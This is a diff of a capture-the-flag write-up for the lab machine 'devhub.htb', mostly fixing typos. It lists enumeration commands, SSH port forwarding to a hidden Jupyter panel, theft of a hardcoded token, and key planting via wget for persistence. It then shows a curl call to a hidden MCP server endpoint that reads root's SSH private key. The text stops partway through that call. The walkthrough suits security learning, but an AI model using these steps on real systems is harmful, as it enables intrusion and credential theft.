@@ -31,18 +31,18 @@
 - Stable Connection: Establishing a persistent SSH session to replace the volatile reverse shell.
 
 ## Lateral movement and system enumeration
-- File enumeration: `cat /etc/passwd` revealed other user: `analyst` with `uid:1002`
-- Socket scan: `ss -tulpn` revealed open port `8888` on `127.0.0.1`, the exact same port was shown on `http://devhub.htb`
-- SSH forwarding: `ssh -i mcp-dev@devhub.htb -L 4444:127.0.0.1:8888` creating port forwarding to access hidden jupyter panel on `127.0.0.1:8888` 
-- Process scan: `ps aux | grep jupyter` shown process with hardcoded `--ServerApp.token`, leading to token compromise
+- File enumeration: `cat /etc/passwd` revealed other user: `analyst` with `uid:1002`.
+- Socket scan: `ss -tulpn` revealed open port `8888` on `127.0.0.1`, the exact same port was shown on `http://devhub.htb`.
+- SSH forwarding: `ssh -i mcp-dev@devhub.htb -L 4444:127.0.0.1:8888` creating port forwarding to access hidden jupyter panel on `127.0.0.1:8888`.
+- Process scan: `ps aux | grep jupyter` shown process with hardcoded `--ServerApp.token`, leading to token compromise.
 
 ## Privilege escalation (`mcp-dev` -> `analyst`)
-- Token usage: Extracted token was used to gain controll over jupyter panel, leading to `analyst` compromise
+- Token usage: Extracted token was used to gain control over jupyter panel, leading to `analyst` compromise.
 - Credential Placement: Deploying the public key into the `analyst/.ssh/authorized_keys` directory via `wget` and previously prepared `http` server.
-- Stable Connection: Establishing a persistent key-based SSH connection
-- `/home/analyst/user.txt` extraction
+- Stable Connection: Establishing a persistent key-based SSH connection.
+- `/home/analyst/user.txt` extraction.
 
-## Priviledge escalation (`analyst` -> `root`)
+## Privilege escalation (`analyst` -> `root`)
 - process and files examination:
     - `ps aux |grep /opt` revealed process owned by `root`
       
@@ -51,14 +51,16 @@
     - `ls -l /opt/opsmcp/server.py `
       
      	 `-rw-r----- 1 analyst analyst 6021 Mar 16 21:49 /opt/opsmcp/server.py`
+as we can see, the process above runs program owned by `analyst`, which allows to modify or examine code.
 
-- file examination: `server.py` contained
+
+- file examination: `server.py` contained hardcoded api key and hidden endpoints:
   	- `VALID_API_KEY = "opsmcp_secret_key_4fXXXXXXXXXXXXXX"`
   	-  Hidden endpoints `ops._admin_dump`, `ops._debug_mode` that weren't in the visible tool list
   	-  The `ops._admin_dump` handler could read `/root/.ssh/id_rsa`
  
-- exploitation:
-
+- exploitation existing flaw:
+  
 		curl -s http://127.0.0.1:5000/tools/call \
 		  -H "X-API-Key: opsmcp_secret_key_4fXXXXXXXXXXXXXX" \
 		  -H "Content-Type: application/json" \
